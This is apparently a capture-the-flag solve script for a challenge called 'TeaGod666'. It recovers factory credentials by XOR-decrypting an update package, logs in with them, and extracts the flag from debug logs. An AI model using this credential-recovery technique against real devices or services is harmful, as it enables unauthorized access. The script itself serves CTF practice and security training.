#!/usr/bin/env python3
"""Recover the TeaGod666 factory credentials and extract the debug-log flag."""

import argparse
import base64
import http.cookiejar
import json
import re
import struct
import urllib.error
import urllib.request


FLAG_RE = re.compile(r"THJCC\{[^\r\n}]*\}")
MAGIC = b"TEAGOD66"


class Client:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(cookie_jar)
        )

    def request(self, path: str, method: str = "GET", body=None) -> bytes:
        data = None
        headers = {}
        if body is not None:
            data = json.dumps(body).encode()
            headers["Content-Type"] = "application/json"

        request = urllib.request.Request(
            self.base_url + path,
            data=data,
            headers=headers,
            method=method,
        )
        try:
            with self.opener.open(request, timeout=15) as response:
                return response.read()
        except urllib.error.HTTPError as error:
            detail = error.read().decode(errors="replace")
            raise RuntimeError(f"HTTP {error.code} for {path}: {detail}") from error

    def json(self, path: str, method: str = "GET", body=None):
        return json.loads(self.request(path, method, body))


def parse_package(package: bytes) -> tuple[dict, bytes]:
    if len(package) < 24 or package[:8] != MAGIC:
        raise ValueError("invalid TeaGod666 package")

    version, key_length, key_offset, payload_offset = struct.unpack_from(
        "<HHHH", package, 8
    )
    reserved = struct.unpack_from("<H", package, 16)[0]
    payload_length = struct.unpack_from("<I", package, 18)[0]

    key = package[key_offset : key_offset + key_length]
    encoded = package[payload_offset : payload_offset + payload_length]
    if len(key) != key_length or len(encoded) != payload_length:
        raise ValueError("truncated TeaGod666 package")

    ciphertext = base64.b64decode(encoded, validate=True)
    plaintext = bytes(
        byte ^ key[index % len(key)] for index, byte in enumerate(ciphertext)
    )
    config = json.loads(plaintext)

    metadata = {
        "version": version,
        "key_length": key_length,
        "key_offset": key_offset,
        "payload_offset": payload_offset,
        "reserved": reserved,
        "payload_length": payload_length,
    }
    return config, key


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "url",
        nargs="?",
        default="http://chal.thjcc.org:7356",
        help="challenge base URL",
    )
    args = parser.parse_args()

    client = Client(args.url)
    update = client.json("/api/update/check")
    package = client.request(update["package_url"])
    config, key = parse_package(package)

    login = client.json(
        "/api/login",
        "POST",
        {"username": config["username"], "password": config["password"]},
    )
    if not login.get("ok"):
        raise RuntimeError("recovered factory credentials were rejected")

    logs = client.json("/api/system/logs?level=debug")
    flag = FLAG_RE.search(json.dumps(logs))
    if not flag:
        raise RuntimeError("flag not found in debug logs")

    print(f"[+] package key: {key.decode(errors='replace')}")
    print(f"[+] factory username: {config['username']}")
    print(f"[+] flag: {flag.group(0)}")


if __name__ == "__main__":
    main()
